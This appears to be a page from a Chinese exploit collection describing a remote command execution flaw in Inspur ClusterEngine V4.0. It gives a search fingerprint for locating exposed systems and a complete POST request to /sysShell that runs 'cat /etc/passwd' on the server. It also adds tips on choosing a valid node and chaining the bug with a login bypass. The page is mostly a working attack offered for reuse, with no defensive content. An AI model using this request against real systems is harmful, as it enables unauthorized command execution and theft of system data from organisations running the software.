# 浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞

## 漏洞描述

浪潮ClusterEngineV4.0 存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限

## 漏洞影响

<a-checkbox checked>浪潮ClusterEngineV4.0</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="TSCEV4.0"</a-checkbox></br>

## 漏洞复现

登录页面如下

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125204987.png)

发送请求包

```shell l
POST /sysShell HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: lang=cn
Cache-Control: max-age=0
Content-Length: 42

op=doPlease&node=cu01&command=cat /etc/passwd
```



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125204983.png)



<a-checkbox checked>注意参数 node 中的 cu01 需要为shell集群中的存在主机</a-checkbox></br>



![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313125204763.png)



这里可以配合任意用户登录漏洞查看主机名